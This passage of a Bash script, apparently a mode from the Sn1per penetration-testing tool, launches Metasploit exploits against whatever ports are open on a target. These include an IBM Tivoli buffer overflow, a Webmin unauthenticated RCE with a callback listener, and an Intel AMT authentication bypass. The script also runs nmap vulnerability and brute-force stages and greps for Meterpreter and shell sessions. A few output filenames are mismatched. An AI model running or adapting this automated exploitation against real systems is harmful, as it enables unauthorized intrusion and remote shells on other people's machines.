    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; set RPORT 8001; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.txt
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.raw 2> /dev/null
  fi
fi

if [[ -z "$port_9495" ]];
then
  echo -e "$OKRED + -- --=[Port 9495 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 9495 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING IBM TIVOLI ENDPOINT OVERFLOW EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use exploit/windows/http/ibm_tivoli_endpoint_bof; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw > $LOOT_DIR/output/msf-$TARGET-port7001-ibm_tivoli_endpoint_bof.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw 2> /dev/null
  fi
fi

if [[ -z "$port_10000" ]];
then
  echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; set SSL True; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw > $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port10000-file_disclosure.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING CVE-2019-15107 WEBMIN <= 1.920 RCE EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use exploit/web/defcon_webmin_unauth_rce; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; set SSL True; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port10000-defcon_webmin_unauth_rce.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port10000-defcon_webmin_unauth_rce.raw > $LOOT_DIR/output/msf-$TARGET-port10000-defcon_webmin_unauth_rce.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port10000-defcon_webmin_unauth_rce.raw 2> /dev/null
  fi
fi

if [[ -z "$port_16992" ]];
then
  echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING INTEL AMT AUTH BYPASS EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port16992-intel_amt_digest_bypass.raw 2> /dev/null
  fi
fi

if [[ -z "$port_27017" ]];
then
  echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -sV -p 27017 -Pn -v --script-timeout 90 --script=mongodb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27017.txt
  fi
fi

if [[ -z "$port_27018" ]];
then
  echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -sV  -p 27018 -Pn -v --script-timeout 90 --script=mongodb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27018.txt
  fi
fi

if [[ -z "$port_27019" ]];
then
  echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -sV  -p 27019 -Pn -v --script-timeout 90 --script=mongodb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port27019.txt
  fi
fi

if [[ -z "$port_28017" ]];
then
  echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -sV  -p 28017 -Pn -v --script-timeout 90 --script=mongodb*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port28017.txt
  fi
fi

if [[ -z "$port_49180" ]];
then
  echo -e "$OKRED + -- --=[Port 49180 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 49180 opened... running tests...$RESET"
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING JAVA RMI SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use auxiliary/scanner/misc/java_rmi_server; setg RHOSTS \"$TARGET\"; set RPORT 49180; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw 2> /dev/null
  fi
fi

if [[ "$VULNSCAN" = "1" ]]; then
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED PERFORMING VULNERABILITYSCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  sniper -t $TARGET -m vulnscan -w $WORKSPACE
fi

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED SCANNING ALL HTTP PORTS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
for a in `cat $LOOT_DIR/nmap/nmap-$TARGET.xml | grep state\=\"open\" | grep http | grep -v https | grep -v ssl | grep tcp | cut -d\" -f4`; do sniper -t $TARGET -m webporthttp -p $a -w $WORKSPACE; done;

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED SCANNING ALL HTTPS PORTS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
for a in `cat $LOOT_DIR/nmap/nmap-$TARGET.xml | grep state\=\"open\" | egrep 'https|ssl' | grep tcp | cut -d\" -f4`; do sniper -t $TARGET -m webporthttps -p $a -w $WORKSPACE; done;

if [[ "$SC0PE_VULNERABLITY_SCANNER" == "1" ]]; then
    source $INSTALL_DIR/modes/sc0pe-network-scan.sh
fi

cd $INSTALL_DIR
source $INSTALL_DIR/modes/fullportscan.sh
source $INSTALL_DIR/modes/bruteforce.sh
rm -f $LOOT_DIR/.fuse_* 2> /dev/null
sort -u $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null > $LOOT_DIR/ips/ips-all-sorted.txt 2> /dev/null

VULNERABLE_METASPLOIT=$(egrep -h -i -s "may be vulnerable|is vulnerable|IKE response with leak|File saved in" $LOOT_DIR/output/msf-$TARGET-*.txt 2> /dev/null)
if [[ ${#VULNERABLE_METASPLOIT} -ge 5 ]]; then
  echo "$VULNERABLE_METASPLOIT" > $LOOT_DIR/output/vulnerable-metasploit-$TARGET.txt 2> /dev/null
fi
VULNERABLE_SHELLSHOCK=$(egrep -h -i -s "The following URLs appear to be exploitable:" $LOOT_DIR/web/shocker-$TARGET-*.txt 2> /dev/null)
if [[ ${#VULNERABLE_SHELLSHOCK} -ge 5 ]]; then
  echo "$VULNERABLE_SHELLSHOCK" > $LOOT_DIR/output/vulnerable-shellshock-$TARGET.txt 2> /dev/null
fi
SHELLED=$(egrep -h -i -s "Meterpreter session|Command executed|File(s) found:|Command Stager progress|File uploaded|Command shell session" $LOOT_DIR/output/msf-$TARGET-*.txt 2> /dev/null)
if [[ ${#SHELLED} -ge 5 ]]; then
  echo "$SHELLED" > $LOOT_DIR/output/shelled-$TARGET.txt 2> /dev/null
fi

source $INSTALL_DIR/modes/sc0pe.sh 

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED SCAN COMPLETE! $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo "$TARGET" >> $LOOT_DIR/scans/updated.txt
rm -f $LOOT_DIR/scans/running_${TARGET}_${MODE}.txt 2> /dev/null
ls -lh $LOOT_DIR/scans/running_*.txt 2> /dev/null | wc -l 2> /dev/null > $LOOT_DIR/scans/tasks-running.txt

echo "[sn1persecurity.com] •?((¯°·._.• Finished Sn1per scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications_new.txt
if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" "[sn1persecurity.com] •?((¯°·._.• Finished Sn1per scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
fi
if [[ "$LOOT" = "1" ]] && [[ -z "$NOLOOT" ]]; then
  loot
fi